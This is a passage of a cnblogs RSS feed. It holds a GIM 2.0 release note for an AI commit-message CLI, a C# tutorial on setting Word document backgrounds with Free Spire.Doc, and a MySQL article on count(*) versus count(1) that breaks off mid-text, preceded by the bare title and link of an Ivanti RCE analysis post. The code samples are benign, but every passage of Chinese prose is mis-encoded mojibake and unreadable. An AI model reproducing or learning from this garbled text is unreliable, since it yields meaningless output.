&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19566043);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19566043', targetLink: 'https://www.cnblogs.com/mhtsec/p/19566043', title: 'Ivanti EPMM RCE CVE-2026-1340/1281å®æ´åæ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ GIM 2.0 åå¸ï¼çæ­£è®© AI æäº¤æ¶æ¯å¯å®å¶ãå¯æ§ãå¯é¡¹ç®çº§ä¼å ]]></title>
    <link>https://www.cnblogs.com/somefuture/p/19565738</link>
    <guid>9c3cdb9cd2f2f52bfee1f5a8837d9050</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/somefuture/p/19565738" title="åå¸äº 2026-02-02 17:37">
    <span role="heading" aria-level="2">GIM 2.0 åå¸ï¼çæ­£è®© AI æäº¤æ¶æ¯å¯å®å¶ãå¯æ§ãå¯é¡¹ç®çº§ä¼å</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>å¤§å®¶å¥½ï¼<strong>GIMï¼Git Intelligence Messageï¼2.0</strong> æ­£å¼åå¸å¦ï¼</p>
<p>GIM æ¯ä¸ä¸ª <strong>åºäºåæ´åå®¹èªå¨çæé«è´¨é Git æäº¤æ¶æ¯çå½ä»¤è¡å·¥å·</strong>ï¼å®å©ç¨ AI å¸®ä½ åæ´è§èãæ´è¯­ä¹åãå¯è¯»æ§æ´å¼ºç commit messageãç¸æ¯ 1.x ç³»åï¼<strong>2.0 æ¯ä¸æ¬¡æ ¸å¿è½ååçº§</strong>ï¼éç¹è§£å³äº AI æäº¤çæå¨çå®é¡¹ç®ä¸­æå¸¸è§çå®å¶ä¸ä¸è´æ§çç¹ã</p>
<p>å®æ¹ç½ç«ï¼<a href="https://git-intelligence-message.pages.dev/" target="_blank" rel="noopener nofollow">https://git-intelligence-message.pages.dev/</a><br>
ä»åºå°åï¼<a href="https://github.com/davelet/git-intelligence-message" target="_blank" rel="noopener nofollow">https://github.com/davelet/git-intelligence-message</a></p>
<hr>
<h2 id="gim-20-æ ¸å¿æ´æ°è½å">GIM 2.0 æ ¸å¿æ´æ°è½å</h2>
<h3 id="1-æ¬å°é¡¹ç®-prompt-æ¯ægim-ç®å½">1. æ¬å°é¡¹ç® Prompt æ¯æï¼.gim ç®å½ï¼</h3>
<p>2.0 çæ¬åè®¸å¨ Git ä»åºæ ¹ç®å½åå»ºä¸ä¸ª <code>.gim</code> æä»¶å¤¹ï¼ç¨äºå­æ¾é¡¹ç® <strong>ç§æ Prompt æ¨¡æ¿</strong>ï¼</p>
<pre><code>your-project/
âââ .git/
âââ .gim/
â   âââ diff_prompt
â   âââ subject_prompt
</code></pre>
<p>è¿æå³çï¼</p>
<ul>
<li>åä¸ªé¡¹ç®å¯ä»¥å®ä¹èªå·±ç AI æç¤ºæ¨¡æ¿</li>
<li>ä¸åé¡¹ç®æ éå±äº«æä¿®æ¹å¨å±éç½®</li>
<li>å¢éè§èãæäº¤é£æ ¼å¯ä»¥ç´æ¥åå¨ä»åºéï¼<strong>å¢éæåå¤©ç¶ç»ä¸</strong></li>
</ul>
<hr>
<h3 id="2-å½ä»¤è¡ä¸´æ¶è¦ç-prompt">2. å½ä»¤è¡ä¸´æ¶è¦ç Prompt</h3>
<p>å¨ä¹åçæ¬ï¼Prompt æ¨¡æ¿åªè½éè¿å¨å±éç½®æä»¶ç»´æ¤ï¼æ æ³çµæ´»è¦çï¼<br>
è 2.0 å¼å¥å½ä»¤åæ°ï¼</p>
<pre><code>--diff-prompt &lt;STRING&gt;
--subject-prompt &lt;STRING&gt;
</code></pre>
<p>ä¾å¦ï¼</p>
<pre><code class="language-bash">gim --diff-prompt "ä¸æ³¨åæ´å®å¨å½±ååæ" \
    --subject-prompt "çæéµå¾ªè§èåæ ¼å¼çæäº¤æ é¢"
</code></pre>
<p>è¿è®©ä½ å¨<strong>ä¸æ¬¡æäº¤ä¸­ä¸´æ¶è¦ç AI æå¼</strong>ï¼éå¸¸éåï¼</p>
<ul>
<li>ä¸´æ¶åâå®å¨ç¸å³ commitâ</li>
<li>ææ¬¡æäº¤éè¦ç¹å«æ ¼å¼</li>
<li>è¯éªæ°çæç¤ºç­ç¥</li>
</ul>
<hr>
<h1 id="prompt-ä¼åçº§">Prompt ä¼åçº§</h1>
<ol>
<li>å½ä»¤è¡ï¼æé«ï¼</li>
<li>é¡¹ç®çº§ .gim ç®å½</li>
<li>å¨å± config</li>
<li>åç½®é»è®¤</li>
</ol>
<h3 id="é¡¹ç®å±ç»ä¸æäº¤è§è">é¡¹ç®å±ç»ä¸æäº¤è§è</h3>
<p>å¨é¡¹ç®æ ¹ç®å½ï¼</p>
<pre><code class="language-bash">mkdir .gim
echo "åæåæ´æ¶çªåºå®å¨æ§å½±å" &gt; .gim/diff_prompt
echo "æè§èåæ ¼å¼çææäº¤æ é¢" &gt; .gim/subject_prompt
</code></pre>
<p>ææå¢éæåæ éåèªéç½®ï¼å¨ç¨ç»ä¸ã</p>
<h3 id="ä¸´æ¶è¦ç-prompt">ä¸´æ¶è¦ç Prompt</h3>
<pre><code class="language-bash">gim --diff-prompt "ä¾§éæ§è½æ¹è¿" \
    --subject-prompt "æ§è½ä¼åæäº¤"
</code></pre>
<h1 id="æ¨èç¨æ³">æ¨èç¨æ³</h1>
<pre><code>gim æ ¹æ®æå­åºçæä»¶åæ´åå®¹çææäº¤æ¶æ¯å¹¶æäº¤
gim -a èªå¨æå­å°æªæå­çåæ´ï¼å¹¶çææäº¤æ¶æ¯æäº¤
gim -p å°æ¬æ¬¡æå­çåæ´åå®¹åå¹¶å°ä¸ä¸æ¬¡æäº¤ä¸­ï¼å¹¶æ ¹æ®è¿ä¸¤æ¬¡åæ´çææäº¤æ¶æ¯æäº¤ï¼å°±æ¯--amendï¼
gim -ap ç¸å½äºgim -aågim -pï¼åæå­ï¼ååå¹¶æäº¤
gim -t &lt;SUB&gt; æå®æäº¤çæ é¢ãä¸æå®-tåæ°çè¯ï¼æ é¢æ¯æ ¹æ®æ¶æ¯åå®¹èªå¨æ»ç»åºæ¥ç
gim update æ´æ°è½¯ä»¶çæ¬ï¼ä¹å¯ä»¥brew upgrade git-intelligence-message
gim ai -m &lt;model&gt; -k &lt;apikey&gt; -u &lt;url&gt; -l &lt;language&gt; è®¾ç½®AIåæ°ãè¿ä¸ªå½ä»¤æ¯åç½®å½ä»¤ï¼æ²¡æè®¾ç½®çè¯ï¼ä¸é¢æºå¸¦åæ°çæ§è¡é½ä¼å¤±è´¥ã-læé»è®¤å¼ï¼æ¯è±è¯­ï¼å¯ä»¥ä¸ç¨æä¾ï¼-uæ¯apiè°ç¨çå°åï¼è½¯ä»¶åç½®äºä¸äºå°åï¼å¯ä»¥æ¥ç https://github.com/davelet/git-intelligence-message?tab=readme-ov-file#built-in-model-support ï¼å¦ææ¨¡ååç§°è½å¹éä¸åç¼ä¹å¯ä»¥ä¸æä¾ã1.3.2çæ¬å¼å§ï¼å¦ægim aiå½ä»¤æ²¡æºå¸¦åæ°ï¼å°è¾åºå½åéç½®
gim -v ä»»ä½å½ä»¤é½å¯ä»¥å¢å -våæ°ï¼ç¨äºæ¥çå½ä»¤çè¯¦ç»æ§è¡è¿ç¨ï¼vè¡¨ç¤º verbose
gim prompt æ¥çå½åæç¤ºè¯ãå¢å --editå¯ä»¥ç¼è¾æç¤ºè¯ï¼å¢å --prompt &lt;P&gt;ç¨äºæå®ç¼è¾æä»¶
æ´è¯¦ç»çç¨æ³å¯ä»¥éè¿-hæ¥çå¸®å©ä¿¡æ¯ãæ¯å¦

gim -h
gim ai -h
gim update -h
gim prompt -h
</code></pre>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.0006944444444444445" data-date-updated="2026-02-02 17:38">2026-02-02 17:37</span>&nbsp;
<a href="https://www.cnblogs.com/somefuture">å¤§å«å°ä¸ï¼Sheldonï¼</a>&nbsp;
éè¯»(<span id="post_view_count">3</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19565738);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19565738', targetLink: 'https://www.cnblogs.com/somefuture/p/19565738', title: 'GIM 2.0 åå¸ï¼çæ­£è®© AI æäº¤æ¶æ¯å¯å®å¶ãå¯æ§ãå¯é¡¹ç®çº§ä¼å' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ C# è®¾ç½® Word ææ¡£èæ¯é¢è²/èæ¯å¾ ]]></title>
    <link>https://www.cnblogs.com/jazz-z/p/19565731</link>
    <guid>5d7f53271f2e6978a2fdeb7c5f6b6545</guid>
    <description>
    <![CDATA[ 
            <div class="postcontent">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>å¨ .NET å¼ååºæ¯ä¸­ï¼å¯¹ Word ææ¡£è¿è¡èªå¨åæ ¼å¼å¤çæ¯å¸¸è§éæ±ï¼å¶ä¸­è®¾ç½®ææ¡£èæ¯ï¼é¢è²æå¾çï¼æ¯æåææ¡£è§è§åç°çåºç¡æä½ãFree Spire.Doc for .NET ä½ä¸ºä¸æ¬¾åè´¹ç Word ææ¡£æä½ç»ä»¶ï¼æ éä¾èµ Microsoft Office å³å¯å®æ Word ææ¡£çåå»ºãç¼è¾ä¸æ ¼å¼è°æ´ï¼æ¬æå°ä»ç»å¦ä½éè¿è¯¥ç»ä»¶å¨ C# ä¸­ä¸º Word ææ¡£è®¾ç½®èæ¯é¢è²æèæ¯å¾çã</p>
<h2 id="ä¸ç¯å¢åå¤">ä¸ãç¯å¢åå¤</h2>
<p>Free Spire.Doc for .NET æ¯æéè¿ NuGet åç®¡çå¨å¿«éå®è£ï¼è¿æ¯æä¾¿æ·çæ¹å¼ï¼</p>
<ul>
<li>æå¼ Visual Studioï¼åå»ºä»»æ .NET é¡¹ç®ï¼å¦ Console AppãASP.NET Coreç­ï¼ï¼</li>
<li>å³é®é¡¹ç®ââç®¡çNuGetç¨åºåââæç´¢âFree Spire.Docââå®è£ææ°çæ¬ï¼</li>
<li>ä¹å¯éè¿NuGetå½ä»¤è¡å®è£ï¼</li>
</ul>
<pre><code class="language-bash">Install-Package FreeSpire.Doc
</code></pre>
<h2 id="äºè®¾ç½®-word-ææ¡£èæ¯é¢è²">äºãè®¾ç½® Word ææ¡£èæ¯é¢è²</h2>
<p>Free Spire.Doc æä¾äº <code>Document.Background</code> æ ¸å¿å±æ§ï¼éåéè¿ <code>Background.Type</code> æå®èæ¯ç±»åä¸º <code>Color</code>ï¼åéè¿ <code>Background.Color</code> è®¾ç½®å·ä½é¢è²ã</p>
<p><strong>å®æ´ä»£ç ç¤ºä¾ï¼</strong></p>
<pre><code class="language-csharp">using Spire.Doc;
using System.Drawing;
using Spire.Doc.Documents;

namespace ConvertWordToPng
{
    class Program
    {
        static void Main(string[] args)
        {
            // åå»ºDocumentå®ä¾
            Document document = new Document();

            // å è½½æ¬å°å·²æWordææ¡£
            document.LoadFromFile("Test.docx"); 

            // æå®ææ¡£èæ¯ç±»å
            document.Background.Type = BackgroundType.Color;

            // è®¾ç½®å·ä½çèæ¯é¢è²
            document.Background.Color = Color.AliceBlue; 

            // ä¿å­ä¿®æ¹åçææ¡£
            document.SaveToFile("çº¯è²èæ¯.docx", FileFormat.Docx);
        }
    }
}
</code></pre>
<h2 id="ä¸è®¾ç½®-word-ææ¡£èæ¯å¾ç">ä¸ãè®¾ç½® Word ææ¡£èæ¯å¾ç</h2>
<p>è®¾ç½®èæ¯å¾çååªéå° <code>Background.Type</code> æ¹ä¸º <code>BackgroundType.Picture</code>ï¼åéè¿ <code>Picture</code> å±æ§æå®å¾çè·¯å¾å³å¯ã</p>
<p><strong>å®æ´ä»£ç ç¤ºä¾</strong></p>
<pre><code class="language-csharp">using Spire.Doc;
using System.Drawing;
using Spire.Doc.Documents;

namespace ConvertWordToPng
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                // åå»ºDocumentå®ä¾å¹¶å è½½æºææ¡£
                Document document = new Document();
                document.LoadFromFile("Test.docx");

                // æå®èæ¯ç±»åä¸ºâå¾çâ
                document.Background.Type = BackgroundType.Picture;
                // è®¾ç½®èæ¯å¾ç
                document.Background.Picture = Image.FromFile("background.jpg");

                // ä¿å­ææ¡£
                document.SaveToFile("PictureBackground.docx", FileFormat.Docx);

                Console.WriteLine("èæ¯å¾çè®¾ç½®å®æï¼");
            }
            catch (Exception ex)
            {
                // æè·æä»¶ä¸å­å¨ãå¾çæ ¼å¼éè¯¯ç­å¼å¸¸
                Console.WriteLine($"æä½å¤±è´¥ï¼{ex.Message}");
            }
        }
    }
}
</code></pre>
<h3 id="æ³¨æäºé¡¹">æ³¨æäºé¡¹</h3>
<ul>
<li>å¾çæ ¼å¼æ¯æï¼JPGãPNGãBMP ç­å¸¸è§æ ¼å¼åå¯ï¼å»ºè®®ä½¿ç¨ä¸ææ¡£é¡µé¢å°ºå¯¸ï¼A4 é»è®¤ 210Ã297mmï¼å¹éçå¾çï¼é¿åæ¾ç¤ºåå½¢ï¼</li>
<li>æ¾ç¤ºæ¨¡å¼ï¼èæ¯å¾çé»è®¤ä»¥ âå¹³éºâ æ¹å¼æ¾ç¤ºï¼æä¸æ¯æç´æ¥è®¾ç½® âæä¼¸â æ¨¡å¼ï¼è¥éæä¼¸ææï¼å¯åéè¿ <code>System.Drawing</code> è°æ´å¾çå°ºå¯¸ååè®¾ç½®ï¼</li>
<li>è·¯å¾é®é¢ï¼å¾çè·¯å¾å»ºè®®ä½¿ç¨ç»å¯¹è·¯å¾ï¼å¦ <code>D:\docs\background_img.png</code>ï¼ï¼é¿åç¸å¯¹è·¯å¾å¯¼è´çæä»¶æ¥æ¾å¤±è´¥ã</li>
</ul>
<hr>
<p>éè¿æ¬æä»ç»çæ¹æ³ï¼å¼åèå¯ä»¥å¨ C# åºç¨ç¨åºä¸­è½»æ¾å®ç°ææ¡£èæ¯çèªå®ä¹ãè½ç¶åè´¹çæ¬å­å¨ä¸äºç¯å¹éå¶ï¼ä½å¯¹äºåºæ¬çææ¡£å¤çéæ±èè¨ï¼å®ä»ç¶æ¯ä¸ä¸ªåè½å®åä¸æäºä½¿ç¨çè§£å³æ¹æ¡ã</p>


</div>
<div class="clear"></div>

            </div>
            <div class="itemdesc">
                åè¡¨äº 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 17:35">2026-02-02 17:35</span>&nbsp;
<a href="https://www.cnblogs.com/jazz-z">LAYONTHEGROUND</a>&nbsp;
éè¯»(<span id="post_view_count">6</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19565731);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19565731', targetLink: 'https://www.cnblogs.com/jazz-z/p/19565731', title: 'C# è®¾ç½® Word ææ¡£èæ¯é¢è²/èæ¯å¾' })">ä¸¾æ¥</a>

            </div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ãé¢è¯é¢ãMySQL ä¸­ count(*)ãcount(1) å count(å­æ®µå) æä»ä¹åºå«ï¼ ]]></title>
    <link>https://www.cnblogs.com/sun-10387834/p/19452600</link>
    <guid>8623fe991e88bdfb40376c9d2b25dacc</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/sun-10387834/p/19452600" title="åå¸äº 2026-02-02 16:25">
    <span role="heading" aria-level="2">ãé¢è¯é¢ãMySQL ä¸­ count(*)ãcount(1) å count(å­æ®µå) æä»ä¹åºå«ï¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="mysql-ä¸­ç-count-ä¸åå¼æçå¤§æ¯æ¼">MySQL ä¸­ç count ä¸åå¼ï¼æçå¤§æ¯æ¼ï¼ð</h1>
<h2 id="ä¸å¿«éç»è®ºåçç»è®ºåçåæ">ä¸ãå¿«éç»è®ºï¼åçç»è®ºåçåæï¼</h2>
<table>
<thead>
<tr>
<th>æ¹å¼</th>
<th>ä½ç¨</th>
<th>æç</th>
<th>ä¸å¥è¯æ»ç»</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>count(*)</code></td>
<td><strong>ç»è®¡ææè¡æ°</strong></td>
<td>â­â­â­â­ <strong>æé«</strong></td>
<td>ææ¯ä¸ä¸çï¼æä¸ºç»è®¡èç</td>
</tr>
<tr>
<td><code>count(1)</code></td>
<td>ç»è®¡ææè¡æ°</td>
<td>â­â­â­â­ åæ ·é«æ</td>
<td>ææ¯ count(*) çé©¬ç²åå¼</td>
</tr>
<tr>
<td><code>count(åå)</code></td>
<td>ç»è®¡è¯¥å<strong>é NULL</strong> çè¡æ°</td>
<td>â­â­â­ è¾æ¢</td>
<td>ææåï¼æåªæ°éç©ºå¼</td>
</tr>
</tbody>
</table>
<p><strong>ç»è®ºï¼ç¨ <code>count(*)</code> å°±å¯¹äºï¼</strong> â</p>
<h2 id="äºä»£ç ç¤ºä¾äº²æµä¸åå¼çå·®å«">äºãä»£ç ç¤ºä¾ï¼äº²æµä¸åå¼çå·®å«</h2>
<h3 id="åå¤æµè¯æ°æ®">åå¤æµè¯æ°æ®</h3>
<pre><code class="language-sql">-- åå»ºæµè¯è¡¨
CREATE TABLE user_test (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(50),
    age INT,
    email VARCHAR(100)
);

-- æå¥æµè¯æ°æ®ï¼æææå¥ä¸äºNULLå¼ï¼
INSERT INTO user_test (name, age, email) VALUES
('å¼ ä¸', 25, 'zhangsan@example.com'),
('æå', NULL, NULL),
('çäº', 30, 'wangwu@example.com'),
(NULL, 28, 'unknown@example.com'),
('èµµå­', 35, NULL);
</code></pre>
<h3 id="æµè¯æ¥è¯¢">æµè¯æ¥è¯¢</h3>
<pre><code class="language-sql">-- æ¥çè¡¨ä¸­çæ°æ®
SELECT * FROM user_test;
/*
+----+--------+------+--------------------+
| id | name   | age  | email              |
+----+--------+------+--------------------+
|  1 | å¼ ä¸   |   25 | zhangsan@example...|
|  2 | æå   | NULL | NULL               |
|  3 | çäº   |   30 | wangwu@example.com |
|  4 | NULL   |   28 | unknown@example.com|
|  5 | èµµå­   |   35 | NULL               |
+----+--------+------+--------------------+
*/

-- æµè¯1ï¼count(*) ç»è®¡ææè¡æ°
SELECT count(*) FROM user_test;  -- ç»æï¼5 â
-- ç¿»è¯ï¼"èæ¿ï¼ææå¤å°è¡æ°æ®ï¼å¨é½è¦ï¼"

-- æµè¯2ï¼count(1) ç»è®¡ææè¡æ°  
SELECT count(1) FROM user_test;  -- ç»æï¼5 â
-- ç¿»è¯ï¼"èæ¿ï¼ä½ ç»æä¸ªåºå®å¼1ï¼ææ°æå¤å°ä¸ª1"

-- æµè¯3ï¼count(åå) ç»è®¡éNULLçè¡æ°
SELECT count(name) FROM user_test;  -- ç»æï¼4 âï¼NULLçé£è¡æ²¡ç®ï¼
SELECT count(age) FROM user_test;   -- ç»æï¼4 âï¼NULLçé£è¡æ²¡ç®ï¼
SELECT count(email) FROM user_test; -- ç»æï¼3 âï¼ä¸¤ä¸ªNULLé½æ²¡ç®ï¼
-- ç¿»è¯ï¼"æåªæ°æèº«ä»½è¯çäººï¼é»æ·ä¸ç®"
</code></pre>
<h2 id="ä¸æ·±å¥åæå®ä»¬å°åºæå¥ä¸å">ä¸ãæ·±å¥åæï¼å®ä»¬å°åºæå¥ä¸åï¼</h2>
<h3 id="1-è¯­ä¹åºå«æéè¦çåºå«">1. <strong>è¯­ä¹åºå«ï¼æéè¦çåºå«ï¼ï¼</strong></h3>
<pre><code class="language-sql">-- count(*) æ¯ SQL æ ååæ³
-- ææï¼ç»æè¿ä¸ªè¡¨æå¤å°è¡æ°æ®
-- ç¸å½äºï¼"è¿ä¸ªä¼è®®å®¤æå¤å°ä¸ªåº§ä½ï¼"

-- count(1) æ¯ count(*) çä¸ç§åæ³
-- ææï¼ç»è®¡æå¤å°ä¸ª1
-- ç¸å½äºï¼"ç»æ¯ä¸ªåº§ä½åä¸ªè¹æï¼æåæ°è¹æ"

-- count(åå) æ¯ç»è®¡è¯¥åéNULLå¼çæ°é
-- ææï¼è¿ä¸ªä¼è®®å®¤æå¤å°äººå¸¦äºææº
-- ç¸å½äºï¼"æ£æ¥æ¯ä¸ªåº§ä½ï¼å¦ææäººå¸¦äºææºå°±è®¡æ°"
</code></pre>
<h3 id="2-æ§è½åºå«ç¥è¯ä¸ç°å®">2. <strong>æ§è½åºå«ï¼ç¥è¯ä¸ç°å®ï¼</strong></h3>
<h4 id="ä¼ è¯´ä¸­çè¯¯è§£">ä¼ è¯´ä¸­çè¯¯è§£ï¼</h4>
<blockquote>
<p>"count(1) æ¯ count(*) å¿«" â<br>
"count(ä¸»é®) æå¿«" â</p>
</blockquote>
<h4 id="ç°å®çç¸">ç°å®çç¸ï¼</h4>
<p><strong>MySQL 5.7 åä»¥åçæ¬</strong>ï¼</p>
<ul>
<li><code>count(*)</code> å <code>count(1)</code> æ§è½<strong>å®å¨ç¸å</strong></li>
<li>MySQL ä¼åå¨ä¼æå®ä»¬å½ä½ä¸åäº</li>
</ul>
<p><strong>æ¥çæ§è¡è®¡åè¯æ</strong>ï¼</p>
<pre><code class="language-sql">EXPLAIN SELECT count(*) FROM user_test;
EXPLAIN SELECT count(1) FROM user_test;
EXPLAIN SELECT count(id) FROM user_test;
-- ä½ ä¼çå°ï¼åä¸¤ä¸ªçæ§è¡è®¡åå®å¨ä¸æ ·ï¼
</code></pre>
<p><strong>æ§è½æåº</strong>ï¼ä¸è¬æåµï¼ï¼</p>
<ol>
<li><code>count(*)</code> â <code>count(1)</code> â­â­â­â­â­</li>
<li><code>count(ä¸»é®å)</code> â­â­â­â­</li>
<li><code>count(éä¸»é®æç´¢å¼å)</code> â­â­â­</li>
<li><code>count(éä¸»é®æ ç´¢å¼å)</code> â­â­</li>
</ol>
<p><strong>ä¸ºä»ä¹ <code>count(åå)</code> å¯è½æ´æ¢ï¼</strong></p>
<pre><code class="language-sql">-- åè®¾ email åæç´¢å¼
SELECT count(email) FROM user_test;
/*
MySQL éè¦ï¼
1. è¯»åç´¢å¼ï¼å¦æè¯¥åæç´¢å¼ï¼
2. æ£æ¥æ¯ä¸ªå¼æ¯å¦ä¸º NULL
3. åªè®¡æ°é NULL ç

å¦æ email åæ²¡æç´¢å¼ï¼
1. è¯»åæ´è¡æ°æ®ï¼æ¯ count(*) è¯»çæ´å¤ï¼
2. æ£æ¥ email æ¯å¦ä¸º NULL
3. åªè®¡æ°é NULL ç
*/
</code></pre>
<h3 id="3-ç¹æ®æåµåæ">3. <strong>ç¹æ®æåµåæ</strong></h3>
<pre><code class="language-sql">-- æåµ1ï¼ææåé½ä¸åè®¸NULL
CREATE TABLE user_not_null (
    id INT PRIMARY KEY NOT NULL,
    name VARCHAR(50) NOT NULL
);
-- è¿æ¶åï¼count(*) = count(id) = count(name)

-- æåµ2ï¼ç©ºè¡¨ vs NULLå¼
CREATE TABLE empty_table (id INT);
SELECT count(*) FROM empty_table;    -- ç»æï¼0
SELECT count(id) FROM empty_table;   -- ç»æï¼0

INSERT INTO empty_table VALUES (NULL);
SELECT count(*) FROM empty_table;    -- ç»æï¼1
SELECT count(id) FROM empty_table;   -- ç»æï¼0 â
</code></pre>
<h2 id="åå®éå·¥ä½ä¸­çéæ©æå">åãå®éå·¥ä½ä¸­çéæ©æå</h2>
<h3 id="-åºæ¯1ç»è®¡æ»è¡æ°">ð¯ <strong>åºæ¯1ï¼ç»è®¡æ»è¡æ°</strong></h3>
<pre><code class="language-sql">-- â æ­£ç¡®åæ³
SELECT count(*) FROM orders;

-- â éè¯¯åæ³
SELECT count(order_id) FROM orders;  -- ä¸ä¸æNULLå¢ï¼
SELECT count(1) FROM orders;         -- è½ç¨ï¼ä½ä¸æ¯æ å
</code></pre>
<h3 id="-åºæ¯2ç»è®¡æææ°æ®æ°é">ð¯ <strong>åºæ¯2ï¼ç»è®¡æææ°æ®æ°é</strong></h3>
<pre><code class="language-sql">-- ç»è®¡æå¤å°ç¨æ·å¡«åäºé®ç®±
SELECT count(email) FROM users;  -- â è¿ä¸ªåºæ¯å°±è¯¥ç¨ count(åå)

-- ç»è®¡å·²å®æè®¢åæ°éï¼åè®¾ status=2 æ¯å·²å®æï¼
SELECT count(*) FROM orders WHERE status = 2;  -- â
</code></pre>
<h3 id="-åºæ¯3ç»è®¡ééå¤å¼">ð¯ <strong>åºæ¯3ï¼ç»è®¡ééå¤å¼</strong></h3>
<pre><code class="language-sql">-- ç»è®¡æå¤å°ä¸ªä¸åçåå¸
SELECT count(DISTINCT city) FROM users;  -- â count + DISTINCT

-- ç»è®¡æå¤å°ä¸ªåå¸ï¼æé¤ NULL
SELECT count(DISTINCT city) FROM users;  -- DISTINCT ä¼èªå¨æé¤ NULL
</code></pre>
<h2 id="äºæ§è½ä¼åæå·§">äºãæ§è½ä¼åæå·§</h2>
<h3 id="1-å¤§è¡¨ä¼åæ¹æ¡">1. <strong>å¤§è¡¨ä¼åæ¹æ¡</strong></h3>
<pre><code class="language-sql">-- æ¹æ¡1ï¼ä½¿ç¨è¿ä¼¼å¼ï¼éç¨äºç»è®¡æ¦è§ï¼
SELECT TABLE_ROWS 
FROM information_schema.TABLES 
WHERE TABLE_SCHEMA = 'your_db' AND TABLE_NAME = 'big_table';

-- æ¹æ¡2ï¼åé¡µæ»æ°ç¼å­ï¼éç¨äºåè¡¨é¡µï¼
-- ç¬¬ä¸æ¬¡æ¥è¯¢æ¶ç¼å­æ»æ°ï¼åé¢å®æ¶æ´æ°

-- æ¹æ¡3ï¼ä½¿ç¨æ±æ»è¡¨
CREATE TABLE stats_daily (
    date DATE PRIMARY KEY,
    user_count INT,
    order_count INT
);
</code></pre>
<h3 id="2-ç´¢å¼ä¼å">2. <strong>ç´¢å¼ä¼å</strong></h3>
<pre><code class="language-sql">-- ä¸º count(åå) åå»ºç´¢å¼
CREATE INDEX idx_email ON users(email);

-- ä½æ³¨æï¼count(*) ä¸ä¸å®éè¦ç´¢å¼ï¼InnoDBæä¼å
</code></pre>
<h2 id="å­æè¶£æ¯å»å¸®ä½ è®°å¿">å­ãæè¶£æ¯å»å¸®ä½ è®°å¿</h2>
<h3 id="-æ±å ¡åºæéæ¯å»">ð <strong>æ±å ¡åºæéæ¯å»</strong></h3>
<pre><code class="language-sql">-- æ10ä¸ªäººå¨æéä¹°æ±å ¡

count(*) = "éåéæ10ä¸ªäºº" â
count(1) = "æç»æ¯äººåä¸ªå·ç çï¼æ°æ10ä¸ªç" â  
count(ç°é) = "åªæ8ä¸ªäººå¸¦äºç°é" â
count(ä¼åå¡) = "åªæ5ä¸ªäººæä¼åå¡" â
</code></pre>
<h3 id="-æå®¤ç¹åæ¯å»">ð« <strong>æå®¤ç¹åæ¯å»</strong></h3>
<pre><code class="language-sql">-- æå®¤éæ50ä¸ªåº§ä½

count(*) = "æå®¤æ50ä¸ªåº§ä½" â
count(1) = "æå¨æ¯ä¸ªåº§ä½æ¾æ¬ä¹¦ï¼æåæ°æ50æ¬" â
count(å­¦ç) = "ä»å¤©æ¥äº45ä¸ªå­¦çä¸è¯¾" âï¼ç©ºåº§ä½ä¸ç®ï¼
</code></pre>
<h2 id="ä¸æ»ç»ä¸æä½³å®è·µ">ä¸ãæ»ç»ä¸æä½³å®è·µ</h2>
<h3 id="-æç»å»ºè®®">ð <strong>æç»å»ºè®®</strong></h3>
<ol>
<li>
<p><strong>ç»è®¡æ»è¡æ°ï¼ä¸å¾ç¨ <code>count(*)</code></strong></p>
<ul>
<li>è¿æ¯ SQL æ ååæ³</li>
<li>æ§è½æä¼ï¼MySQLæä¸é¨ä¼åï¼</li>
<li>è¯­ä¹ææç¡®</li>
</ul>
</li>
<li>
<p><strong>ç»è®¡æåé NULL æ°éï¼ç¨ <code>count(åå)</code></strong></p>
<ul>
<li>è¿æ¯å®çæ¬èå·¥ä½</li>
<li>ä¸è¦ç¨å®ç»è®¡æ»è¡æ°</li>
</ul>
</li>
<li>
<p><strong>å³äº <code>count(1)</code></strong></p>
<ul>
<li>æ§è½ä¸ <code>count(*)</code> ä¸æ ·</li>
<li>ä½ä¸å¤"æ å"ï¼åæ¹è¨</li>
<li>å»ºè®®ç»ä¸ç¨ <code>count(*)</code></li>
</ul>
</li>
<li>
<p><strong>æ§è½å³é®ç¹</strong></p>
<ul>
<li>å¤§è¡¨é¿åé¢ç¹ count</li>
<li>èèä½¿ç¨ç¼å­ææ±æ»è¡¨</li>
<li>ä¸º count(åå) çåå ç´¢å¼</li>
</ul>
</li>
</ol>
<h3 id="-ä¸å¼ å¾çæ">ð <strong>ä¸å¼ å¾çæ</strong></h3>
<pre><code>count(*)       -&gt; æ»æ° -&gt; æå¿« -&gt; æ¨èä½¿ç¨
    â
count(1)       -&gt; æ»æ° -&gt; ä¸æ ·å¿« -&gt; å¯ç¨ä½ä¸æ å
    â
count(ä¸»é®)    -&gt; æ»æ° -&gt; æ¬¡å¿« -&gt; ä¸»é®éNULLæ¶å¯ç¨
    â
